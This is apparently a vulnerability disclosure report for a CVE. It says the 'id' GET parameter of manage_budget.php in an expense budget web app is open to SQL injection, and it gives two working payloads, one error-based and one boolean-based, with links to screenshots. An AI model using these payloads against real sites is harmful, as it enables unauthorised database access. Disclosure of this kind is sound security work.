BUG_Author：wucwu1

Vulnerability File: /expense_budget/admin/budget/manage_budget.php

GET parameter 'id' exists SQL injection vulnerability

Payload1: id=1' and (select 2 from(select count(*),concat(0x55565758,(select (elt(888=888,1))),0x65666768,floor(rand(0)*2))x from information_schema.plugins group by x)a) and 'a'='a

Error-based SQL injection succeeds.

![image](https://github.com/wucwu1/CVEApplication/blob/main/sql1.png)

Payload2: id=1' and 777=777 and 'GSD'='GSD

The Boolean value is judged correctly, so the page is displayed normally.

![image](https://github.com/wucwu1/CVEApplication/blob/main/sql2.png)
